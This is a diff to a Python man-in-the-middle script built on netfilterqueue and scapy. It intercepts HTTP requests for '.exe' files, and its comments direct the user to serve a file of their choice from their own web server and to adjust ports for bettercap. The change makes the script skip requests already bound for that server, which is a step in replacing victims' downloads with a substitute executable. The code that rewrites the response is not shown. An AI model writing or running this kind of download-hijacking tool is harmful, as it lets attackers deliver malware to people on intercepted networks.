@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 
+# serverIp refers to your webserver Ex. Appache server with your desired file
+
 import netfilterqueue
 import scapy.all as scapy
 
@@ -18,8 +20,9 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        # if your using better cap replace the ports with given port numbers
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
+            if ".exe" in scapy_packet[scapy.Raw].load and "serverIP" not in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
         elif scapy_packet[scapy.TCP].sport == 80:
